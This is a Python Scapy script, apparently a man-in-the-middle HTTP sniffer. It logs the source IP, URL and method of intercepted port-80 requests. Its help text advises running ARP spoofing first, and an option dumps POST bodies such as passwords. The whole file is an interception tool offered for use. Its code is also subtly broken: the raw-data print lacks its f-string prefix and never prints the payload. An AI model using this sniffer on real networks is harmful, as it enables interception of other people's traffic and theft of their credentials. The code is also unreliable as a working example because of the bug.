#!/usr/bin/env python3
import argparse
from scapy.all import *
from scapy.layers.http import HTTPRequest

def sniff_packets(iface=None):
    # Sniff 80 Port packets with 'iface', if None (default), then the Scapy's default interface is used
    if iface:
        # Port 80 for HTTP (generally).
        # `process_packet` is the callback.
        sniff(filter="port 80", prn=process_packet, iface=iface, store=False)
    else:
        sniff(filter="port 80", prn=process_packet, store=False)

def process_packet(packet):
    if packet.haslayer(HTTPRequest):
        # If this packet is an HTTP Request. Get the requested URL.
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        # Get the requester's IP Address.
        ip = packet[IP].src
        # Get the request method.
        method = packet[HTTPRequest].Method.decode()
        print(f"\033[32m[+] {ip} Requested {url} with {method}\033[0m")

        if show_raw and packet.haslayer(Raw) and method == "POST":
            print("\033[91m[*] Some useful Raw data: {packet[Raw].load}\033[0m")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
                                                 + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
    parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
    parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")

    args = parser.parse_args()
    iface = args.iface
    show_raw = args.show_raw

    sniff_packets(iface)
